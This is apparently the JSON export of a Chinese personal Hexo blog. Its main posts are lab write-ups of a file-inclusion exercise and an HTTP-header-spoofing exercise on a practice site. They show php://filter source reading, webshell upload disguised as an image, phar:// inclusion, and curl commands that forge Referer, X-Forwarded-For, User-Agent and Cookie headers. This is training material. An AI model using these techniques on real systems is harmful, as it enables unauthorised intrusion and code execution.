{"meta":{"title":"gwolfs的个人博客","subtitle":"","description":"","author":"gwolfs","url":"http://blog.ydq6.com","root":"/"},"pages":[{"title":"categories","date":"2020-04-30T13:34:01.000Z","updated":"2020-04-30T13:35:12.193Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ydq6.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-04-30T13:35:30.000Z","updated":"2020-04-30T13:35:56.646Z","comments":true,"path":"tags/index.html","permalink":"http://blog.ydq6.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"实验-文件包含漏洞","slug":"实验-文件包含漏洞","date":"2020-05-01T04:18:04.000Z","updated":"2020-05-01T04:20:17.150Z","comments":true,"path":"uncategorized/实验-文件包含漏洞/","link":"","permalink":"http://blog.ydq6.com/uncategorized/%E5%AE%9E%E9%AA%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"文件包含漏洞实验 gwolfs 本地文件包含（1）提示include.php，访问include.php （2）提示参数为file.利用file=include.php发现文件包含生效。 （3）尝试读取源代码 1file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;include.php base64解码后： 123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :) &lt;!-- upload.php --&gt;&lt;&#x2F;html&gt;&lt;?php @$file &#x3D; $_GET[&quot;file&quot;]; if(isset($file)) &#123; if (preg_match(&#39;&#x2F;http|data|ftp|input|%00&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;70) &#123; echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;; &#125; else &#123; include($file); &#125; &#125;?&gt; 可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。 （4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。 上传一个一句话木马post.php。发现上传失败 因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png. 上传成功： 接下来进行文件包含。 http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png 利用菜刀连接即可。 远程文件包含（1）参数有file,提示php文件。代表只输入文件名就可以。 猜测代码： 12$file&#x3D;$_GET[&#39;file&#39;].&quot;php&quot;;include($file); （2）读源码 file=php://filter/convert.base64-encode/resource=include 123456789101112131415161718&lt;html&gt;Tips: &lt;!-- upload.php --&gt;&lt;&#x2F;html&gt;&lt;?php @$file &#x3D; $_GET[&quot;file&quot;]; if(isset($file)) &#123; if (preg_match(&#39;&#x2F;http|data|ftp|input|%00&#x2F;i&#39;, $file) || strstr($file,&quot;..&quot;) !&#x3D;&#x3D; FALSE || strlen($file)&gt;&#x3D;70) &#123; echo &quot;&lt;p&gt; error! &lt;&#x2F;p&gt;&quot;; &#125; else &#123; include($file.&#39;.php&#39;); &#125; &#125;?&gt; 题目要求phar，现在上传一个zip文件。 发现不能上传zip。抓包看下是基于什么机制过滤的。 发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg 然后利用phar协议访问zip中的post.php 1http:&#x2F;&#x2F;47.105.75.177&#x2F;vulnlab&#x2F;include&#x2F;2&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;webshell.jpg&#x2F;post.php 用菜刀连接尝试,发现连接失败。 看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径： 1http:&#x2F;&#x2F;47.105.75.177&#x2F;vulnlab&#x2F;include&#x2F;2&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;..&#x2F;1&#x2F;upload&#x2F;webshell.jpg&#x2F;post.php 发现报错error。 再想一下，不仅忘记去掉后缀名php了，而且不支持.. 尝试使用绝对路径 1http:&#x2F;&#x2F;47.105.75.177&#x2F;vulnlab&#x2F;include&#x2F;2&#x2F;include.php?file&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;vulnlab&#x2F;include&#x2F;1&#x2F;upload&#x2F;webshell.jpg&#x2F;post 菜刀连接，成功连接","categories":[],"tags":[]},{"title":"test1","slug":"test1","date":"2020-05-01T04:16:48.000Z","updated":"2020-05-01T04:16:48.930Z","comments":true,"path":"uncategorized/test1/","link":"","permalink":"http://blog.ydq6.com/uncategorized/test1/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"实验_web安全之HTTP头部字段理解","slug":"实验-web安全之HTTP头部字段理解","date":"2020-04-30T12:55:32.000Z","updated":"2020-04-30T13:37:29.149Z","comments":true,"path":"web/实验-web安全之HTTP头部字段理解/","link":"","permalink":"http://blog.ydq6.com/web/%E5%AE%9E%E9%AA%8C-web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/","excerpt":"","text":"web安全之HTTP头部字段理解第一题 观察HTTP 响应头题目提示观察http响应头所以只观察响应头即可。通过命令 1curl -v 47.105.75.177/vulnlab/head/1.php 得到: 1key: hello world! 第二题 Referer理解提示必须从www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段 通过命令 1curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php 从响应中获取key: 1key: you are right 第三题 X-Forwarded-For理解通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 http://www.hetianlab.com/ 。先curl下： 1curl 47.105.75.177/vulnlab/head/3.php 得到： 1this page only accept come from localhost 本地才能访问，所以伪造X-Forwarded-For为127.0.0.1 1curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php 得到key 1key: you are right 第四题 User-Agent理解题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令： 1curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php 得到key: 1key: you are right 第五题 Accept-Language理解 题目提示只允许外国人登录,猜测接收语言为英语即可。 1curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php 第六题 Cookie理解题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。 1curl -v 47.105.75.177/vulnlab/head/6.php 发现响应头中会设置cookie: 1Set-Cookie: Login=anonymous 所以请求时将cookie设置为Login=admin即可。 1curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://blog.ydq6.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-04-29T15:31:27.813Z","updated":"2020-04-30T12:56:06.116Z","comments":true,"path":"uncategorized/hello-world/","link":"","permalink":"http://blog.ydq6.com/uncategorized/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://blog.ydq6.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"http","slug":"http","permalink":"http://blog.ydq6.com/tags/http/"}]}